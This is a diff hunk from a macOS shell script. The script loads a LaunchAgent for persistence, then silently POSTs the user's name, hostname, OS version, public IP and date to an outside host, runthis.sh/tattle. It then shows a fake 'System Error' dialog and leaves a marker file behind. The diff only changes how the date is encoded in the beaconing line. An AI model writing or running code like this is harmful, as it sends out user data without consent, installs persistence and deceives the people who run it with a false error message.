@@ -98,7 +98,7 @@ if [[ -f $HOME/.unlocked ]]; then
 EOF
     launchctl load $HOME/Library/LaunchAgents/com.sre.unlocked.plist
 fi
- curl -X POST -s "https://runthis.sh/tattle?user=$(whoami)&host=$(hostname)&os=$(sw_vers -productVersion)&ip=$(curl -s ifconfig.me)&date=$(date)"
+ curl -X POST -s "https://runthis.sh/tattle?user=$(whoami)&host=$(hostname)&os=$(sw_vers -productVersion)&ip=$(curl -s ifconfig.me)&date=${$(date)// /%20}"
 osascript -e 'tell app "System Events" to display dialog "An unknown error occurred. Have you tried turning it off and on again?" with title "System Error"'
 
 touch $HOME/.unlocked
